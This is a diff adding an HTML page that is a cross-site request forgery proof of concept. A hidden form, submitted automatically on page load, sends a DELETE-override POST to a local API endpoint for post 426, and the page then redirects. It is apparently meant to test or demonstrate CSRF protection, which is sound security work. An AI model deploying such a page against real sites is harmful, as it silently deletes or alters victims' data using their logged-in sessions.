@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>This site is not what it seems...</h1>
+    <form
+      action="http://localhost:3000/api/post/426"
+      method="POST"
+      id="maliciousForm"
+    >
+      <input type="hidden" name="_method" value="DELETE" />
+    </form>
+
+    <script>
+      document.getElementById("maliciousForm").submit();
+
+      // wait for 2 seconds before redirecting
+      setTimeout(() => {
+        window.location.href = "http://localhost:3000";
+      }, 2000);
+    </script>
+  </body>
+</html>
